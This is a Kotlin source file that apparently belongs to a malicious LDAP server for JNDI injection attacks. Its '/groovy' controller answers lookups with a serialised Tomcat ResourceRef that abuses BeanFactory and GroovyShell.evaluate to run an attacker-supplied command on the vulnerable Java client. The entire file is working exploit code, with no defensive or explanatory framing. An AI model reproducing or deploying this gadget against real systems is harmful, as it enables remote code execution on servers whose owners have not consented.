package ldap.controllers

import util.Options
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import org.apache.naming.ResourceRef
import util.base46cmd
import util.serialize
import javax.naming.StringRefAddr

@LDAPMapping(["/groovy"])
class Groovy : Controller {

    val payload = "'${base46cmd(Options.command)}'.execute()"

    override fun sendResult(result: InMemoryInterceptedSearchResult, base: String) {
        val ref = ResourceRef(
            "groovy.lang.GroovyShell", null, "", "",
            true, "org.apache.naming.factory.BeanFactory", null
        ).apply {
            add(StringRefAddr("forceString", "x=evaluate"))
            add(StringRefAddr("x", payload))
        }
        val entry = Entry(base).apply {
            addAttribute("javaClassName", "java.lang.String")  // could be any
            addAttribute("javaSerializedData", serialize(ref))
        }

        result.sendSearchEntry(entry)
        result.result = LDAPResult(0, ResultCode.SUCCESS)
    }
}
